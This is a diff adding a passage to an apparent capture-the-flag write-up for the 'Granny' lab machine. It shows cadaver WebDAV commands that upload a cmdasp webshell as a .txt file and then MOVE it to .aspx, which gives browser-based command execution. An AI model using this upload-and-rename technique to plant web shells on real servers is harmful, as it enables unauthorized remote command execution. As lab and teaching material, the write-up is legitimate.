@@ -120,3 +120,41 @@ You have attempted to execute a CGI, ISAPI, or other executable program from a d
 
 
 ```
+
+Learned about a tool called cadaver that's a CLI for webdav on Unix. Also, there are webshells in Parrot in /usr/share/webshells. I am using the aspx one from that folder.
+
+I'll try with cadaver and curl to copy the aspx shell. We can't PUT an aspx file directly due to restricted permissions. But the server allows MOVE webdav method, so we can PUT a text file and then MOVE it to aspx.
+
+With cadaver:
+```
+$cadaver http://10.10.10.15
+dav:/> help
+Available commands: 
+ ls         cd         pwd        put        get        mget       mput       
+ edit       less       mkcol      cat        delete     rmcol      copy       
+ move       lock       unlock     discover   steal      showlocks  version    
+ checkin    checkout   uncheckout history    label      propnames  chexec     
+ propget    propdel    propset    search     set        open       close      
+ echo       quit       unset      lcd        lls        lpwd       logout     
+ help       describe   about      
+Aliases: rm=delete, mkdir=mkcol, mv=move, cp=copy, more=less, quit=exit=bye
+dav:/> put cmdasp.txt
+Uploading cmdasp.txt to `/cmdasp.txt':
+Progress: [=============================>] 100.0% of 1400 bytes succeeded.
+dav:/> move cmdasp.txt Destination:http://10.10.10.15/cmdasp.aspx
+Moving `/cmdasp.txt' to `/Destination%3ahttp%3a//10.10.10.15/cmdasp.aspx':  failed:
+404 Resource Not Found
+dav:/> move cmdasp.txt http://10.10.10.15/cmdasp.aspx
+Moving `/cmdasp.txt' to `/http%3a//10.10.10.15/cmdasp.aspx':  failed:
+404 Resource Not Found
+dav:/> move cmdasp.txt cmdasp.aspx
+Moving `/cmdasp.txt' to `/cmdasp.aspx':  succeeded.
+dav:/> 
+
+```
+We can do the same thing with curl too. Once that file is changed to aspx, visiting the web page shows a field to enter a command. 
+
+![Granny ASP Shell](/images/granny1.png)
+
+
+
